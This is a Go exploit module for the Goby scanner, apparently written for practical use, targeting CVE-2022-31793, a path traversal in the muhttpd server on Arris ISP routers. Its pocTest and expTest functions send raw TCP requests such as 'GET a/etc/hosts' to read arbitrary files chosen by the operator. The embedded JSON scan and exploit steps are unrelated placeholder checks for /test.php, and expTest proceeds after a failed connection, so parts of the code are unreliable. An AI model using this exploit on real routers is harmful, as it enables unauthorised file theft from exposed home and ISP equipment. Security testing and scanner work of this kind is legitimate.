package cve_2022_31793

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net"
	"strings"
	"time"
)

func init() {
	expJson := `{
  "Name": "muhttpd file read vulnerability",
  "Description": "The muhttpd server 1.1.5 (last official release 2010) has a path traversal vulnerability.This issue has been patched and deployed by at least one ISP, whose BGW routers use a customized variant of Arris NVG firmware.Multiple vulnerabilities exist in the MIT-licensed muhttpd web server. This web server is widely used in ISP customer premise equipment (CPE), most notably in Arris firmware used in router models (at least, possibly other) NVG443, NVG599, NVG589, NVG510, as well as ISP-customized variants such as BGW210 and BGW320 (Arris has declined to confirm affected models).",
  "Product": "muhttpd",
  "Homepage": "https://fofa.so/",
  "DisclosureDate": "2022-07-29",
  "Author": "",
  "FofaQuery": "'body=\"Block11.gif\"",
  "GobyQuery": "'body=\"Block11.gif\"",
  "Level": "2",
  "Impact": "There are at least 19,000 Internet-facing likely vulnerable routers exposed directly to the Internet (at the time of writing, though patching since private disclosure has greatly reduced this number)<br></p>",
  "Recommendation": "Stop the web server, or firewall it from untrusted networks (Internet, LAN). For affected Arris-based gateways: Disable remote management, or firewall the remote access ports from the Internet. This does not stop LAN (Ethernet or WiFi) exploitation, however. For regular users of muhttpd: Upgrade to version 1.1.7<br></p>",
  "References": [
    "https://fofa.so/"
  ],
  "Is0day": false,
  "HasExp": true,
  "ExpParams": [
	{
		"name": "AttackType",
		"type": "select",
		"value": "file"
	},
	{
		"name": "file",
		"type": "input",
		"value": "/etc/hosts"
	}
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [
    ""
  ],
  "VulType": [
    ""
  ],
  "CVEIDs": [
    "CVE-2022-31793"
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "muhttpd file read vulnerability",
      "Product": "muhttpd",
      "Description": "The muhttpd server 1.1.5 (last official release 2010) has a path traversal vulnerability.This issue has been patched and deployed by at least one ISP, whose BGW routers use a customized variant of Arris NVG firmware.Multiple vulnerabilities exist in the MIT-licensed muhttpd web server. This web server is widely used in ISP customer premise equipment (CPE), most notably in Arris firmware used in router models (at least, possibly other) NVG443, NVG599, NVG589, NVG510, as well as ISP-customized variants such as BGW210 and BGW320 (Arris has declined to confirm affected models).<br></p>",
      "Recommendation": "Stop the web server, or firewall it from untrusted networks (Internet, LAN). For affected Arris-based gateways: Disable remote management, or firewall the remote access ports from the Internet. This does not stop LAN (Ethernet or WiFi) exploitation, however. For regular users of muhttpd: Upgrade to version 1.1.7<br></p>",
      "Impact": "There are at least 19,000 Internet-facing likely vulnerable routers exposed directly to the Internet (at the time of writing, though patching since private disclosure has greatly reduced this number)<br></p>",
      "VulType": [
        ""
      ],
      "Tags": [
        ""
      ]
    },
    "EN": {
      "Name": "muhttpd file read vulnerability",
      "Product": "muhttpd",
      "Description": "The muhttpd server 1.1.5 (last official release 2010) has a path traversal vulnerability.This issue has been patched and deployed by at least one ISP, whose BGW routers use a customized variant of Arris NVG firmware.Multiple vulnerabilities exist in the MIT-licensed muhttpd web server. This web server is widely used in ISP customer premise equipment (CPE), most notably in Arris firmware used in router models (at least, possibly other) NVG443, NVG599, NVG589, NVG510, as well as ISP-customized variants such as BGW210 and BGW320 (Arris has declined to confirm affected models).<br></p>",
      "Recommendation": "Stop the web server, or firewall it from untrusted networks (Internet, LAN). For affected Arris-based gateways: Disable remote management, or firewall the remote access ports from the Internet. This does not stop LAN (Ethernet or WiFi) exploitation, however. For regular users of muhttpd: Upgrade to version 1.1.7<br></p>",
      "Impact": "There are at least 19,000 Internet-facing likely vulnerable routers exposed directly to the Internet (at the time of writing, though patching since private disclosure has greatly reduced this number)<br></p>",
      "VulType": [
        "Arbitrary File Read"
      ],
      "Tags": [
        "Arbitrary File Read"
      ]
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		pocTest,
		expTest,
	))
}

func pocTest(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
	var buf [4096]byte
	addr := u.HostInfo
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		log.Printf("get conn failed,err:%v", err)
		return false
	}

	msg := "GET a/etc/hosts / HTTP/1.1\r\nUser-Agent: curl/7.29.0\r\nHost: " + u.IP + "\r\nAccept: */*\r\n\r\n"
	log.Println(msg)
	conn.Write([]byte(msg))

	time.Sleep(time.Millisecond * 500)

	n, err := conn.Read(buf[:])
	if nil != err {
		log.Printf("func: PocTest, method: conn.Read, errInfo:", err)
		return false
	}
	result := string(buf[0:n])
	log.Println(result)

	if strings.Contains(result, "200 OK") {
		log.Println("poc verify successful")
		return true
	}
	return false
}

func expTest(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
	var buf [4096]byte
	addr := expResult.HostInfo.HostInfo
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		log.Printf("get conn failed,err:%v", err)
	}

	if ss.Params["AttackType"].(string) == "file" {
		file := ss.Params["file"].(string)
		log.Printf("filename:%v", file)
		msg := "GET a" + file + " / HTTP/1.1\r\nUser-Agent: curl/7.29.0\r\nHost: " + expResult.HostInfo.IP + "\r\nAccept: */*\r\n\r\n"
		log.Printf("tcp body:\n%v", msg)
		conn.Write([]byte(msg))

		time.Sleep(time.Millisecond * 500)

		n, err := conn.Read(buf[:])
		if nil != err {
			log.Printf("func: expTest, method: conn.Read, errInfo:", err)
		}
		result := string(buf[0:n])
		log.Println(result)
		if strings.Contains(result, "200 OK") {
			log.Println("exp verify successful")
			expResult.Success = true
		}
		expResult.OutputType = "text"
		expResult.Output += result
	}
	return expResult
}
